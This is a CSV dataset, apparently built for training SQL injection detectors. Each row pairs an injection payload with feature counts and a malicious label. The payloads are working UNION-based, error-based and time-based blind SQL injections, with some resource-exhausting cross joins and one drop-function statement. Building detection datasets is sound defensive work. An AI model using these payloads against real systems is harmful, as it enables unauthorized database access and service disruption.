Query,Data,Singlequotes,Doublequotes,Punctuations,1-linecmt,Mulline-cmt,Spaces,Safekywrd,Harmflkywrd,Percentages,Log_oprtr,Operator,Nulls,Hex-dec,Db_info,Roles,Ntwr_cmds,Lang_cmds,Alphabets,Digits,Spl_char,Label
1   )    )    and 2886  =  1133--,0,0,0,4,0,0,7,1,0,0,2,5,0,0,0,0,0,0,3,9,0,1
"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",0,0,4,21,0,0,27,3,1,0,4,6,0,3,0,0,0,1,48,35,4,1
"1%'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   '%'  =  '",0,4,0,13,0,0,19,2,0,2,4,8,0,1,0,0,0,0,18,22,4,1
"-1168   )    )    as vlol where 3475  =  3475 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",0,0,0,20,0,0,48,8,3,0,6,10,0,2,0,0,0,1,74,45,0,1
1'  )   as twny where 9580  =  9580,0,1,0,2,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
"1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",0,0,0,26,0,0,47,2,7,0,3,14,2,0,0,0,0,0,72,27,0,1
"1%'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",0,4,0,17,0,0,27,3,3,2,4,9,0,0,0,0,0,1,75,8,4,1
"1""  )   where 4180  =  4180 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,1,23,0,0,41,2,5,0,2,12,1,0,0,0,0,0,57,32,1,1
"1%'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",0,1,0,13,0,0,21,6,3,1,6,11,0,0,0,0,0,1,65,8,1,1
"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'zknl'  =  'zknl",0,4,0,20,0,0,32,2,0,0,4,12,0,0,0,0,0,0,48,16,4,1
1%'   )    )    or sleep  (  5  )  #,0,1,0,5,0,0,9,1,1,1,1,2,0,0,0,0,1,0,7,2,1,1
"1  )   as ujjg where 3125  =  3125 union all select null,null,null,null,null,null#",0,0,0,6,0,0,12,4,1,0,1,2,6,0,0,0,0,1,49,9,0,1
end and   (  '%'  =  ',0,3,0,4,0,0,6,1,0,1,2,4,0,0,0,0,0,0,6,0,3,1
"-8875""  )   where 8428  =  8428 or 1519  =  5756--",0,0,1,5,0,0,10,1,0,0,1,6,0,0,0,0,0,0,7,20,1,1
"elt  (  5953  =  5953,1  )  ",0,0,0,3,0,0,6,0,0,0,0,1,0,0,0,0,0,0,3,9,0,1
"1' where 2160  =  2160 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",0,1,0,21,0,0,36,4,1,0,2,7,0,3,0,0,0,3,49,40,1,1
"1'||  (  select 'xsoq' from dual where 6690  =  6690 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",0,4,0,16,0,0,38,3,7,0,2,9,0,0,0,7,0,2,132,20,4,1
"-5014%""   )    )     )   or 3348  =  2430--",0,0,1,7,0,0,8,1,0,1,1,6,0,0,0,0,0,0,2,12,1,1
"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",0,0,0,7,0,0,12,1,0,0,1,1,0,0,0,0,0,0,13,11,0,1
1'+  (  select gguu where 7809  =  7809 union all select null--,0,1,0,4,0,0,12,5,0,0,1,5,1,0,0,0,0,2,33,9,1,1
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",0,0,2,6,1,0,16,3,0,0,2,7,0,0,0,1,0,1,26,4,2,1
"1%'   )    )     )   union all select null,null,null,null--",0,1,0,9,0,0,8,4,0,1,1,4,4,0,0,0,0,1,30,1,1,1
"1"" rlike   (  select   (  case when   (  2724  =  4757  )   then 1 else 0x28 end   )    )    and ""cmsa""  =  ""cmsa",0,0,4,10,0,0,23,3,1,0,3,5,0,1,0,0,0,1,42,13,4,1
"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",0,1,0,17,0,0,22,0,1,0,0,0,0,2,0,0,0,0,49,24,1,1
"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",0,3,0,9,0,0,19,2,1,0,2,5,0,0,0,0,1,1,26,18,3,1
"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",0,1,0,11,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,44,1,1
"-2314""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""uatq"" like ""uatq",0,0,4,12,0,0,16,5,0,0,4,6,0,0,0,0,0,0,24,16,4,1
-8071   )    )    or 9160  =  4253,0,0,0,3,0,0,7,1,0,0,1,3,0,0,0,0,0,0,2,12,0,1
"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",0,0,0,10,0,0,5,4,0,0,1,4,0,0,0,0,0,1,14,36,0,1
"1' where 9222  =  9222 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,1,0,12,0,0,24,2,3,0,2,7,0,0,0,0,0,1,77,16,1,1
"1""   )    )    union all select null,null,null,null,null,null,null,null,null,null--",0,0,1,14,0,0,7,4,0,0,1,3,10,0,0,0,0,1,54,1,1,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'jloi'  =  'jloi",0,3,0,10,0,0,16,2,0,0,2,4,0,0,0,0,0,1,40,8,3,1
1 where 5359  =  5359 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,0,0,0,31,0,0,72,3,1,0,3,28,0,0,0,0,0,1,94,53,0,1
1'+  (  select 'jkgf' where 7487  =  7487,0,3,0,4,0,0,8,1,0,0,0,2,0,0,0,0,0,1,15,9,3,1
-8131'   )    )    or 9680  =  3467,0,1,0,4,0,0,7,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""cdai""  =  ""cdai",0,0,4,11,0,0,20,3,0,0,3,6,0,0,0,0,0,1,42,13,4,1
"-4764""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""dfvz"" like ""dfvz",0,0,4,43,0,0,80,5,13,0,5,17,0,0,0,0,0,1,92,50,4,1
1'||  (  select 'qdkb' where 4331  =  4331,0,3,0,4,0,0,8,1,0,0,0,3,0,0,0,0,0,1,15,9,3,1
"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",0,4,0,18,0,0,28,8,0,0,8,11,0,0,0,5,0,1,73,10,4,1
"1 union all select null,null,null--",0,0,0,4,0,0,5,4,0,0,1,3,3,0,0,0,0,1,26,1,0,1
1  )   as pqle where 4039  =  4039 and 7533  =  7533--,0,0,0,3,0,0,12,1,1,0,2,6,0,0,0,0,0,0,14,17,0,1
1   )    )    as xoch where 8765  =  8765 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,0,0,0,42,0,0,96,3,2,0,2,33,0,0,0,0,0,2,112,59,0,1
"1"" and 2006  =  2006",0,0,1,1,0,0,5,1,0,0,2,3,0,0,0,0,0,0,3,9,1,1
"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,0,0,4,20,0,0,26,4,1,2,4,8,0,3,0,0,0,2,37,39,4,1
"1""   )    )    as bovm where 5560  =  5560 union all select null,null,null,null,null,null,null#",0,0,1,9,0,0,13,4,1,0,1,2,7,0,0,0,0,1,53,9,1,1
1 where 4844  =  4844,0,0,0,0,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,0,1
"1""  )   as axua where 6718  =  6718",0,0,1,2,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
"1""  )   where 2837  =  2837 and   (  3020  =  3020  )  *6703--",0,0,1,6,0,0,13,1,0,0,2,7,0,0,0,0,0,0,8,21,1,1
"-4346'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",0,1,0,20,0,0,41,8,2,0,6,9,0,2,0,0,0,1,63,37,1,1
"1""   )    )    as sgln where 7573  =  7573",0,0,1,3,0,0,9,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,0,0,0,6,1,0,15,2,1,0,1,4,0,0,0,0,1,1,23,10,0,1
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'hzav'  =  'hzav",0,4,0,16,0,0,28,2,0,0,4,12,0,0,0,0,0,0,48,16,4,1
1 where 8889  =  8889,0,0,0,0,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,0,1
1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'mmfq'  =  'mmfq,0,4,0,39,0,0,77,3,2,0,4,27,0,0,0,0,0,1,102,45,4,1
"1""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""kfdh"" like ""kfdh",0,0,4,46,0,0,77,4,8,0,4,15,2,0,0,0,0,1,119,35,4,1
"1 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",0,0,0,11,0,0,20,6,3,0,5,9,0,0,0,0,0,1,64,8,0,1
"1   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  4744  =  4744",0,0,0,13,0,0,31,3,4,0,4,7,0,0,0,0,0,1,75,17,0,1
or 1  =  1--,0,0,0,2,0,0,4,1,0,0,1,4,0,0,0,0,0,0,2,2,0,1
" select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",0,0,2,6,1,0,18,3,0,0,2,8,0,0,0,1,0,1,26,5,2,1
"1%""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""%""  =  """,0,0,4,42,0,0,73,3,8,2,3,17,2,0,0,0,0,1,107,35,4,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",0,1,0,20,0,0,31,2,4,0,2,7,2,0,0,0,0,1,57,16,1,1
" end and   (  ""qkkn"" like ""qkkn",0,0,3,4,0,0,6,2,0,0,3,3,0,0,0,0,0,0,18,0,3,1
"1""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""akha"" like ""akha",0,0,4,9,0,0,14,5,0,0,5,6,0,0,0,0,0,0,25,13,4,1
"1'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",0,1,0,14,0,0,29,2,7,0,1,5,0,0,0,7,0,1,108,12,1,1
"1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",0,0,0,17,0,0,30,0,2,0,0,1,0,2,0,0,0,0,61,31,0,1
-3752%' union all select 9351--,0,1,0,4,0,0,5,4,0,1,1,5,0,0,0,0,0,1,14,8,1,1
-6823'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'lwlk' like 'lwlk,0,4,0,40,0,0,77,5,1,0,5,28,0,0,0,0,0,1,103,48,4,1
"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",0,0,0,5,0,0,11,1,1,0,2,3,0,0,0,0,1,0,11,10,0,1
"-1722' union all select 1408,1408,1408#",0,1,0,4,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,16,1,1
-6567'   )    )    union all select 3217#,0,1,0,4,0,0,7,4,0,0,1,2,0,0,0,0,0,1,14,8,1,1
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,0,1,0,9,0,0,18,3,1,0,1,2,0,0,0,0,1,2,30,2,1,1
exec  (  @s  ) ,0,0,0,2,0,0,4,0,1,0,0,0,0,0,0,0,0,0,5,0,0,1
"1'||  (  select 'pzto' from dual where 7338  =  7338 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",0,4,0,13,0,0,32,3,4,0,2,9,0,0,0,0,0,2,95,17,4,1
"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",0,0,0,20,0,0,42,8,2,0,6,9,0,2,0,0,0,1,63,37,0,1
"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'zglq'  =  'zglq",0,4,0,36,0,0,57,3,7,0,4,16,2,0,0,0,0,0,82,29,4,1
"1' union all select null,null--",0,1,0,4,0,0,5,4,0,0,1,3,2,0,0,0,0,1,22,1,1,1
-2129'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'eutm' like 'eutm,0,4,0,41,0,0,78,5,13,0,5,17,0,0,0,0,0,1,92,50,4,1
"1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",0,0,0,14,0,0,29,1,0,0,2,12,0,0,0,0,0,0,42,24,0,1
-3540 where 7302  =  7302 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,0,0,0,32,0,0,72,3,1,0,2,28,0,0,0,0,0,1,93,56,0,1
select   (  case when   (  5768  =  9169  )   then 5768 else 1/  (  select 0  )   end  )  --,0,0,0,8,0,0,20,2,1,0,0,4,0,0,0,0,0,2,31,14,0,1
-3998'   )    )    or 3038  =  3038,0,1,0,4,0,0,7,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
1'  )   as pogx where 4105  =  4105 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,0,1,0,38,0,0,80,2,4,0,2,27,0,0,0,0,0,1,86,53,1,1
"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",0,1,0,14,0,0,22,7,0,1,7,12,0,0,0,5,0,1,63,10,1,1
"1"" where 5845  =  5845 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",0,0,1,11,0,0,23,7,0,0,7,12,0,0,0,5,0,1,68,18,1,1
"-2434  )   union all select 8310,8310,8310,8310,8310--",0,0,0,8,0,0,6,4,0,0,1,4,0,0,0,0,0,1,14,24,0,1
"-3721'  )   union all select 9050,9050--",0,1,0,6,0,0,6,4,0,0,1,4,0,0,0,0,0,1,14,12,1,1
"1"" and make_set  (  6520  =  9958,9958  )  ",0,0,1,4,0,0,8,3,0,0,2,3,0,0,0,0,0,0,10,13,1,1
"1'   )    )     )   union all select null,null,null,null,null,null,null--",0,1,0,12,0,0,8,4,0,0,1,3,7,0,0,0,0,1,42,1,1,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",0,0,0,7,0,0,13,1,3,0,0,1,0,0,0,0,0,1,69,3,0,1
"1'||  (  select 'djoe' from dual where 8063  =  8063   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   ||'",0,4,0,42,0,0,78,3,8,0,1,17,2,0,0,0,0,2,127,43,4,1
"1%""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""%""  =  """,0,0,4,24,0,0,30,1,1,2,2,5,0,2,0,0,0,0,52,24,4,1
"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kkim""  =  ""kkim",0,0,4,41,0,0,81,5,14,0,5,18,0,0,0,0,0,2,103,47,4,1
"1',  (  select   (  case when   (  6750  =  6750  )   then 1 else 6750*  (  select 6750 from information_schema.character_sets  )   end   )    )   ",0,1,0,11,0,0,24,7,2,0,2,4,0,0,0,0,0,2,65,18,1,1
-4684  )   as uqjn where 4550  =  4550 or 1689  =  5825,0,0,0,2,0,0,12,1,1,0,1,4,0,0,0,0,0,0,13,20,0,1
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",0,1,0,26,0,0,40,5,1,0,2,5,0,3,0,0,0,4,49,71,1,1
if  (  7899  =  7899  )   select 7899 else drop function zbbp--,0,0,0,4,0,0,12,1,1,0,0,3,0,0,0,0,0,2,28,12,0,1
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",0,2,0,15,0,0,19,3,2,0,3,8,0,0,1,0,1,1,39,7,2,1
"1'+  (  select 'bztp' where 2541  =  2541 union all select null,null,null,null,null,null,null,null,null,null--",0,3,0,15,0,0,12,5,0,0,1,5,10,0,0,0,0,2,69,9,3,1
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",0,1,0,10,0,0,19,7,0,0,6,8,0,0,0,5,0,1,62,10,1,1
1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,0,4,0,8,0,0,12,3,1,0,4,4,0,0,0,0,1,0,22,2,4,1
"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'uorw' like 'uorw",0,4,0,15,0,0,24,6,0,0,6,8,0,0,0,0,0,1,46,13,4,1
-7874   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  2817  =  2817,0,0,0,41,0,0,82,4,13,0,4,17,0,0,0,0,0,1,80,58,0,1
-1643' where 1968  =  1968 or 3484  =  6642,0,1,0,2,0,0,9,1,0,0,1,4,0,0,0,0,0,0,7,20,1,1
1 where 2382  =  2382,0,0,0,0,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,0,1
-2761 or 1144  =  7657-- mfml,0,0,0,3,1,0,6,1,0,0,1,5,0,0,0,0,0,0,6,12,0,1
"1   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   3003  =  3003",0,0,0,14,0,0,35,3,7,0,3,6,0,0,0,7,0,1,111,20,0,1
-7111' or   (  8459  =  8459  )  *4906,0,1,0,4,0,0,8,1,0,0,1,4,0,0,0,0,0,0,2,16,1,1
1%'   )    )     ) ,0,1,0,4,0,0,4,0,0,1,0,1,0,0,0,0,0,0,0,1,1,1
"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",0,0,1,9,0,0,12,4,1,0,1,5,0,0,0,0,0,1,25,32,1,1
-3026  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,0,0,0,31,0,0,68,3,1,0,2,25,0,0,0,0,0,1,88,48,0,1
"1""   )    )    as lfte where 3811  =  3811 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",0,0,1,23,0,0,40,4,2,0,1,6,0,3,0,0,0,3,54,40,1,1
1'+  (  select 'dhcv' where 9372  =  9372,0,3,0,4,0,0,8,1,0,0,0,2,0,0,0,0,0,1,15,9,3,1
" select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1",0,0,2,5,1,0,16,3,0,0,2,7,0,0,0,1,0,1,26,4,2,1
-4906'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'pkrq'  =  'pkrq,0,4,0,40,0,0,77,4,1,0,4,28,0,0,0,0,0,1,99,48,4,1
"-7101   )    )     )   union all select 4587,4587,4587,4587,4587,4587--",0,0,0,11,0,0,8,4,0,0,1,4,0,0,0,0,0,1,14,28,0,1
"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",0,4,0,11,0,0,16,3,0,0,5,6,0,0,0,0,0,0,21,13,4,1
"-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--",0,1,0,11,0,0,6,4,0,0,1,4,0,0,0,0,0,1,14,32,1,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""%""  =  """,0,0,3,10,0,0,17,7,0,1,7,10,0,0,0,5,0,1,63,5,3,1
1'   )    )     )   and sleep  (  5  )   and    (    (     (  'vbck' like 'vbck,0,4,0,12,0,0,16,3,1,0,5,5,0,0,0,0,1,0,23,2,4,1
"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",0,1,0,8,0,0,16,1,0,0,1,5,0,1,0,0,0,0,20,29,1,1
1'+  (  select 'qbdh' where 4006  =  4006 and 7533  =  7533  )  +',0,4,0,6,0,0,14,2,0,0,2,6,0,0,0,0,0,1,18,17,4,1
select sleep  (  5  ) ,0,0,0,2,0,0,5,1,1,0,0,0,0,0,0,0,1,1,11,1,0,1
"1' in boolean mode  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #",0,1,0,17,0,0,26,3,1,0,2,3,0,3,0,0,0,1,49,35,1,1
"1"" or sleep  (  5  )   and ""fbuo"" like ""fbuo",0,0,4,6,0,0,10,3,1,0,4,4,0,0,0,0,1,0,22,2,4,1
select pg_sleep  (  5  )   and   (  '%'  =  ',0,3,0,6,0,0,10,2,1,1,2,4,0,0,0,0,1,1,16,1,3,1
"1' union all select null,null,null,null,null,null--",0,1,0,8,0,0,5,4,0,0,1,3,6,0,0,0,0,1,38,1,1,1
